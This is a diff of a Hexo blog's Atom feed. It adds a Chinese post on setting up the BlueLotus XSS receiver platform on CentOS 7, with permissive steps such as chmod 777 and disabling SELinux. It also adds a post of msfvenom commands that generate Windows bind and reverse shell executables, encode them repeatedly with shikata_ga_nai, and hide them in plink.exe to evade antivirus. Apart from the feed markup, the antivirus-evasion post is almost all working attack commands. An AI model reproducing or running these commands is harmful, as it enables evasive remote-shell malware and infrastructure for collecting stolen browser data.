@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-08-26T02:05:16.617Z</updated>
+  <updated>2019-08-26T02:13:36.404Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Centos7搭建xss平台</title>
+    <link href="http://yoursite.com/2019/08/19/Centos7%E6%90%AD%E5%BB%BAxss%E5%B9%B3%E5%8F%B0/"/>
+    <id>http://yoursite.com/2019/08/19/Centos7搭建xss平台/</id>
+    <published>2019-08-19T08:54:47.000Z</published>
+    <updated>2019-08-26T02:13:36.404Z</updated>
+    
+    <content type="html"><![CDATA[<p>所需环境<br>系统：centos7.x<br>Web容器：Apache<br>脚本语言：php<br>其他：GIT,iptables防火墙设置，vps（没有vps，什么都是假的）<br>安装环境<br>安装Apache<br>yum install httpd -y //一定要加-y，不然有可能启动不了<br>启动Apache服务<br>systemctl start httpd.service //启动服务<br>systemctl stop httpd.service //关闭服务<br>systemctl restart httpd.service //重新启动服务<br>验证Apache<br>浏览器输入自己本机ip地址或者回环地址<br>设置开机启动Apache服务（个人需求来决定）<br>systemctl enable httpd.service //开机启动<br>systemctl disable httpd.service //开机不启动<br>安装PHP<br>yum install php -y<br>安装git工具<br>yum install git -y<br>删除Apache默认界面<br>rm -rf /var/www/* (rm -rf 目录路径 Linux常用删除命令）<br>在www目录下创建网站文件夹<br>mkdir /var/www/xss (mkdir 新目录路径 linux创建新目录）<br>从Github上获取xss平台源码<br>git clone <a href="https://github.com/firesunCN/BlueLotus_XSSReceiver.git" target="_blank" rel="noopener">https://github.com/firesunCN/BlueLotus_XSSReceiver.git</a> /var/www/xss/<br>获取xss平台源码的时候报错安装不了<br>查看下git版本，为1.8.x(默认yum源的版本)，故猜到为版本太低造成的问题。升级git最新版后再执行git pull<br>Sudo yum update nss curl (nss为名称解析和认证服务 curl为网络请求库）<br>赋予目录权限<br>Chmod -R 777 /var/www/xss/(chmod能改变权限 -R是目录下的所有权限，777就是最高权限）<br>配置Apache<br>新建虚拟主机的配置文件<br>mkdir /etc/httpd/conf/vhost （先新建一个文件夹）<br>touch /etc/httpd/conf/vhost/httpd-vhosts.conf (创建配置文件）<br>编辑虚拟文件<br>Vi /etc/httpd/conf/vhost/httpd-vhosts.conf<br>加入以下代码<br>&lt;VirtualHost *:80&gt;<br>DocumentRoot “/var/www/xss”<br>DirectoryIndex admin.php<br><virtualhost><br>将编辑的虚拟主机文件复制一份<br>cp /etc/httpd/conf/httpd.conf /etc/httpd/conf/httpd.conf.bak<br>编辑Apache配置文件httpd.conf<br>Vi /etc/httpd/conf/httpd.conf<br>修改DocumentRoot参数<br>“/var/www/xss”<br>修改optinos<br>optinos execcgi followsysmlinks<br>修改Allowoverride<br>all<br>文件结尾加一下语句，创建虚拟主机<br>Include /etc/httpd/conf/vhost/httpd-vhosts.conf<br>检测文件是否有错误<br>httpd -t<br>假如报错，请参考上面修改看看有没有错误，无法打开网页则添加一句<br>ServerName localhost:80<br>重新加载Apache配置文件<br>Systemctl start httpd<br>命令开放80端口<br>Firewall -cmd –zone=public –add-port=80/tcp –permanent<br>重新启动防火墙<br>Systemctl restart firewalld<br>浏览器访问服务器，安装<br>修改密码，其他可以默认，也可以根据需求来改<br>解决xss数据不可写问题<br>Vi /etc/selinux/config<br>加 SELINUX=disabled<br>其他全部注释</virtualhost></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;所需环境&lt;br&gt;系统：centos7.x&lt;br&gt;Web容器：Apache&lt;br&gt;脚本语言：php&lt;br&gt;其他：GIT,iptables防火墙设置，vps（没有vps，什么都是假的）&lt;br&gt;安装环境&lt;br&gt;安装Apache&lt;br&gt;yum install httpd -y //
+      
+    
+    </summary>
+    
+    
+      <category term="系统" scheme="http://yoursite.com/tags/%E7%B3%BB%E7%BB%9F/"/>
+    
+  </entry>
   
   <entry>
     <title>GoogleBBR</title>
@@ -40,25 +63,25 @@
   </entry>
   
   <entry>
-    <title>Centos7搭建xss平台</title>
-    <link href="http://yoursite.com/2019/08/19/Centos7%E6%90%AD%E5%BB%BAxss%E5%B9%B3%E5%8F%B0/"/>
-    <id>http://yoursite.com/2019/08/19/Centos7搭建xss平台/</id>
+    <title>免杀生成</title>
+    <link href="http://yoursite.com/2019/08/19/Kali%E5%85%8D%E6%9D%80%E4%B8%80/"/>
+    <id>http://yoursite.com/2019/08/19/Kali免杀一/</id>
     <published>2019-08-19T08:54:47.000Z</published>
-    <updated>2019-08-26T02:13:36.404Z</updated>
+    <updated>2019-08-28T01:22:02.983Z</updated>
     
-    <content type="html"><![CDATA[<p>所需环境<br>系统：centos7.x<br>Web容器：Apache<br>脚本语言：php<br>其他：GIT,iptables防火墙设置，vps（没有vps，什么都是假的）<br>安装环境<br>安装Apache<br>yum install httpd -y //一定要加-y，不然有可能启动不了<br>启动Apache服务<br>systemctl start httpd.service //启动服务<br>systemctl stop httpd.service //关闭服务<br>systemctl restart httpd.service //重新启动服务<br>验证Apache<br>浏览器输入自己本机ip地址或者回环地址<br>设置开机启动Apache服务（个人需求来决定）<br>systemctl enable httpd.service //开机启动<br>systemctl disable httpd.service //开机不启动<br>安装PHP<br>yum install php -y<br>安装git工具<br>yum install git -y<br>删除Apache默认界面<br>rm -rf /var/www/* (rm -rf 目录路径 Linux常用删除命令）<br>在www目录下创建网站文件夹<br>mkdir /var/www/xss (mkdir 新目录路径 linux创建新目录）<br>从Github上获取xss平台源码<br>git clone <a href="https://github.com/firesunCN/BlueLotus_XSSReceiver.git" target="_blank" rel="noopener">https://github.com/firesunCN/BlueLotus_XSSReceiver.git</a> /var/www/xss/<br>获取xss平台源码的时候报错安装不了<br>查看下git版本，为1.8.x(默认yum源的版本)，故猜到为版本太低造成的问题。升级git最新版后再执行git pull<br>Sudo yum update nss curl (nss为名称解析和认证服务 curl为网络请求库）<br>赋予目录权限<br>Chmod -R 777 /var/www/xss/(chmod能改变权限 -R是目录下的所有权限，777就是最高权限）<br>配置Apache<br>新建虚拟主机的配置文件<br>mkdir /etc/httpd/conf/vhost （先新建一个文件夹）<br>touch /etc/httpd/conf/vhost/httpd-vhosts.conf (创建配置文件）<br>编辑虚拟文件<br>Vi /etc/httpd/conf/vhost/httpd-vhosts.conf<br>加入以下代码<br>&lt;VirtualHost *:80&gt;<br>DocumentRoot “/var/www/xss”<br>DirectoryIndex admin.php<br><virtualhost><br>将编辑的虚拟主机文件复制一份<br>cp /etc/httpd/conf/httpd.conf /etc/httpd/conf/httpd.conf.bak<br>编辑Apache配置文件httpd.conf<br>Vi /etc/httpd/conf/httpd.conf<br>修改DocumentRoot参数<br>“/var/www/xss”<br>修改optinos<br>optinos execcgi followsysmlinks<br>修改Allowoverride<br>all<br>文件结尾加一下语句，创建虚拟主机<br>Include /etc/httpd/conf/vhost/httpd-vhosts.conf<br>检测文件是否有错误<br>httpd -t<br>假如报错，请参考上面修改看看有没有错误，无法打开网页则添加一句<br>ServerName localhost:80<br>重新加载Apache配置文件<br>Systemctl start httpd<br>命令开放80端口<br>Firewall -cmd –zone=public –add-port=80/tcp –permanent<br>重新启动防火墙<br>Systemctl restart firewalld<br>浏览器访问服务器，安装<br>修改密码，其他可以默认，也可以根据需求来改<br>解决xss数据不可写问题<br>Vi /etc/selinux/config<br>加 SELINUX=disabled<br>其他全部注释</virtualhost></p>]]></content>
+    <content type="html"><![CDATA[<p>生成反弹shell<br>Msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -a -x86 –platform win -f exe -o a.exe<br>加密生成的反弹shell<br>msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -f raw -e<br>x86/shikata_ga_nai -i 5 | msfvenom -a x86 –platform windows -e x86/<br>countdown -i 8 -f raw | msfvenom -a x86 –platform windows -e x86/<br>shikata_ga_nai -i 9 -b ‘\x00’ -f exe -o a.exe<br>ڥ利用模板隐藏shell<br> msfvenom -p windows/shell_reverse_tcp -x /usr/share/windows-binaries/<br>plink.exe lhost=1.1.1.1 lport=4444 -a x86 –platform win -f exe -o a.exe<br> msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/<br>plink.exe lhost=1.1.1.1 lport=4444 -e x86/shikata_ga_nai -i 5 -a x86 –<br>platform win -f exe &gt; b.exe<br>最基础的免杀加密生成</p>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;p&gt;所需环境&lt;br&gt;系统：centos7.x&lt;br&gt;Web容器：Apache&lt;br&gt;脚本语言：php&lt;br&gt;其他：GIT,iptables防火墙设置，vps（没有vps，什么都是假的）&lt;br&gt;安装环境&lt;br&gt;安装Apache&lt;br&gt;yum install httpd -y //
+        &lt;p&gt;生成反弹shell&lt;br&gt;Msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -a -x86 –platform win -f exe -o a.exe&lt;br&gt;加密生成的反弹shell&lt;br&gt;msfveno
       
     
     </summary>
     
     
-      <category term="系统" scheme="http://yoursite.com/tags/%E7%B3%BB%E7%BB%9F/"/>
+      <category term="Kali" scheme="http://yoursite.com/tags/Kali/"/>
     
   </entry>
   
